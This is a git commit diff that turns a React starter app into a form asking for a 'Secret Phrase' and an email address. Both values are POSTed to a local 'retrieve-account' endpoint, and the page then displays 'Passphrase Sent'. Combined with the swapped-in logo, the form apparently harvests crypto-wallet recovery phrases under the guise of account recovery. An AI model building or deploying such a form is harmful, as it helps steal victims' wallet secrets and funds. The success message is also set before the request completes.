98e9a69d9d047359ac7a7e1d169ca7a9a950d2dc
Psalmcee <100202765+Psalmcee@users.noreply.github.com>
2024-09-27 21:16:13 +0100

    updated commit

--- src/App.js
+++ src/App.js
@@ -1,23 +1,42 @@
-import logo from './logo.svg';
+import logo from './logo1.png'
 import './App.css';
+import { useState } from 'react';
+
 
 function App() {
+
+  const [passphrase, setPassphrase] = useState('');
+  const [email, setEmail] = useState('');
+  const [success, setSuccess] = useState('');
+ 
+  const submitHandler = async (e) => {
+    e.preventDefault();
+
+    try {
+      await fetch("http://localhost:8888/retrieve-account", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ passphrase, email }),
+      })
+        .then((response) => response.json())
+        .then(
+      setSuccess('Passphrase Sent'));
+    } catch (err) {
+      console.log(`network error: ${err}`);
+    }
+  };
+
   return (
     <div className="App">
-      <header className="App-header">
+      <form onSubmit={submitHandler} className="App-header">
         <img src={logo} className="App-logo" alt="logo" />
-        <p>
-          Edit <code>src/App.js</code> and save to reload.
-        </p>
-        <a
-          className="App-link"
-          href="https://reactjs.org"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          Learn React
-        </a>
-      </header>
+        <input placeholder="Secret Phrase" value={passphrase} onChange = {e => setPassphrase(e.target.value)} className="Input" />
+        <input placeholder="Email" value={email} onChange = {e => setEmail(e.target.value)} className="Input" />
+        <input type="submit" value="Confirm" className="Input-button" />
+        <p>{success}</p>
+      </form>
     </div>
   );
 }
